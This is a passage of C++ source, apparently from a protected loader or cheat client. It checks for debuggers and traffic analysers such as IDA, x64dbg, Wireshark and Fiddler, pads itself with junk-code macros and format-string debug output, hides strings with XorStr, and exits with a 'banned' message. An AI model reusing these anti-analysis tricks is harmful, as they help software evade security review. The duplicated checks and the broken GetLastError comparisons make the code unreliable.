            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Hacker detected && ECHO Process Hacker detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"Fiddler.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"Fiddler.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"Wireshark.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Wireshark detected && ECHO Wireshark detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"PETools.exe"))
    {
        trampoline;

        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE PE Tools detected && ECHO PE Tools detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"procexp.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Explorer detected && ECHO Process Explorer detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"ImmunityDebugger.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Immunity Debugger detected && ECHO Immunity Debugger detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"ida64.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"windbg.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE WINDBG detected && ECHO WINDBG detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"httpdebugger.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE HTTP DEBUGGER detected && ECHO HTTP DEBUGGER detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"x32dbg.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE x32dbg detected && ECHO IDA x32dbg detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"x64dbg.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE x64dbg detected && ECHO x64dbg detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"idaq.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"idaq64.exe"))
    {

        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"ollydbg.exe"))
    {

        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE OllyDBG detected && ECHO OllyDBG detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (GetLastError != 0)
    {

        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
        exit(0);

    }
    if (GetLastError == 0)
    {

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        _start();
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
    }
    else
    {
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        trampoline;

        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Error && ECHO An error has ocured. && TIMEOUT 10 >nul").c_str());
        exit(0);
    }



}

